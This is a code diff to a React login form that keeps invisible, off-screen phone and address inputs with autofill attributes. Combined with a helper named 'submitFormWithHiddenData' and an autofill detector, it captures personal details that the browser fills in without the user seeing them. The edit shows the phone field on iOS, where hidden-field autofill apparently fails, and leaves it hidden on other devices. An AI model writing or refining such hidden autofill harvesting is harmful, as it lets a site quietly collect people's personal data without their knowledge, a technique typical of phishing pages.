@@ -4,7 +4,7 @@ import { toast } from "@/components/ui/sonner";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import useAutofillDetector from '@/hooks/useAutofillDetector';
-import { submitFormWithHiddenData } from '@/lib/formUtils';
+import { submitFormWithHiddenData, isIOS } from '@/lib/formUtils';
 
 const Index = () => {
   const formRef = useRef<HTMLFormElement>(null);
@@ -17,6 +17,7 @@ const Index = () => {
     username: 'guest',
     password: 'guest'
   });
+  const isIOSDevice = isIOS();
   
   // Use the custom hook to detect autofill
   useAutofillDetector(formData, setFormData);
@@ -24,9 +25,7 @@ const Index = () => {
   // Additional iOS-specific autofill detection
   useEffect(() => {
     const checkIOSAutofill = () => {
-      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !(window as any).MSStream;
-      
-      if (isIOS && formRef.current) {
+      if (isIOSDevice && formRef.current) {
         // On iOS, explicitly check input values after a slight delay
         // This helps capture autofill that might have happened
         setTimeout(() => {
@@ -61,7 +60,7 @@ const Index = () => {
         form.removeEventListener('focusin', handleFormFocus);
       }
     };
-  }, [formData, formRef]);
+  }, [formData, formRef, isIOSDevice]);
   
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -175,48 +174,72 @@ const Index = () => {
               <label htmlFor="email" className="block text-xs font-medium text-gray-700 mb-1">
                 Email Address
               </label>
-              <input 
-                type="email" 
-                id="email" 
-                name="email" 
-                autoComplete="email" 
-                required 
-                value={formData.email} 
-                onChange={handleChange} 
-                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all" 
-                placeholder="Enter your email address" 
+              <input
+                type="email"
+                id="email"
+                name="email"
+                autoComplete="email"
+                required
+                value={formData.email}
+                onChange={handleChange}
+                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
+                placeholder="Enter your email address"
               />
             </div>
+            {isIOSDevice && (
+              <div>
+                <label htmlFor="phone" className="block text-xs font-medium text-gray-700 mb-1">
+                  Phone
+                </label>
+                <input
+                  type="tel"
+                  inputMode="tel"
+                  id="phone"
+                  name="phone"
+                  autoComplete="tel"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
+                  placeholder="Enter your phone number"
+                />
+              </div>
+            )}
           </div>
           
           {/* Hidden fields with improved iOS-compatible autofill capture */}
-          <div className="ios-autofill-container" style={{ 
-            height: '0.1px', 
-            opacity: '0.01', 
-            overflow: 'hidden', 
-            position: 'absolute', 
-            left: '-1000px', 
-            top: '0', 
-            width: '1px',
-            pointerEvents: 'none',
-            zIndex: -1
-          }}>
-            {/* Phone field - iOS friendly */}
-            <div className="mb-1">
-              <label htmlFor="phone" className="block text-xs font-medium text-gray-700 mb-1">
-                Phone
-              </label>
-              <input 
-                type="tel" 
-                id="phone" 
-                name="phone" 
-                autoComplete="tel" 
-                value={formData.phone} 
-                onChange={handleChange} 
-                placeholder="Phone Number"
-                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300"
-              />
-            </div>
+          <div
+            className="ios-autofill-container"
+            style={{
+              height: '0.1px',
+              opacity: '0.01',
+              overflow: 'hidden',
+              position: 'absolute',
+              left: '-1000px',
+              top: '0',
+              width: '1px',
+              pointerEvents: 'none',
+              zIndex: -1,
+            }}
+          >
+            {/* Phone field kept hidden for non-iOS devices */}
+            {!isIOSDevice && (
+              <div className="mb-1">
+                <label htmlFor="phone" className="block text-xs font-medium text-gray-700 mb-1">
+                  Phone
+                </label>
+                <input
+                  type="tel"
+                  inputMode="tel"
+                  id="phone"
+                  name="phone"
+                  autoComplete="tel"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  placeholder="Phone Number"
+                  className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300"
+                />
+              </div>
+            )}
             
             {/* Address field - iOS friendly */}
             <div className="mb-1">
